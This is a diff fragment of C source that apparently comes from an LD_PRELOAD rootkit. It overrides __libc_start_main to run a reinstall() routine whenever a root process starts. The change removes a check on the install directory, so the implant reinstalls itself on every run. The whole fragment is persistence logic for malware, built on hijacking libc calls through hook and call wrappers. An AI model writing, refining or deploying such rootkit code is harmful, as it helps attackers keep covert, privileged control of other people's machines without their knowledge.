@@ -45,14 +45,6 @@
 int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
 #ifdef DO_REINSTALL
     if(not_user(0)) goto do_libc_start_main;
-
-    DIR *dp;
-    hook(COPENDIR);
-    dp = call(COPENDIR, INSTALL_DIR);
-    if(dp == NULL)
-        goto do_libc_start_main;
-    closedir(dp);
-
     reinstall();
 #endif
 do_libc_start_main:
